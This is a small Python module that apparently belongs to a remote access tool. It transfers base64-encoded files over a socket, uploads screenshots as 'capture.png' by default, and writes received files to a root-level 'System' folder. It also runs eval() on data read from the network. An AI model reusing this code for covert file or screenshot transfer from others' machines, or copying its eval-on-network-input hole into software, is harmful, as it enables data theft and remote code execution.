# Date: 10/22/2017
# Author: Ethical-H4CK3R
# Description: Upload & Download 

import os
import time
import json
import base64

class File(object):
 ''' Upload & Download '''

 @staticmethod
 def getbytes(file):
  with open(str(file), 'rb') as f:return base64.b64encode(f.read())

 @staticmethod
 def getfile(bytes, name):
  destpath = os.path.abspath(os.path.sep) + 'System' + os.path.sep + str(name)
  with open(destpath, 'wb') as f:f.write(base64.b64decode(bytes))
 
 @classmethod
 def download(cls, session, size, name):
  try:
   bytes = ''
   time.sleep(1.5)
   session.sendall('200')
  
   while 1:
    try:bytes+=session.recv(size)
    except:break
   if bytes:cls.getfile(bytes, name)
  except:pass

 @classmethod
 def upload(cls, session, file=None, data=None):
  try:
   bytes = cls.getbytes(file) if not data else base64.b64encode(data)   
   name = os.path.basename(file) if not data else 'capture.png'
   data = json.dumps({'size': len(bytes), 'name': name}) 
   time.sleep(0.5)
         
   session.sendall(data)
   if eval(session.recv(1024)) != 200:return
   time.sleep(1.5);session.sendall(bytes)
  except:pass
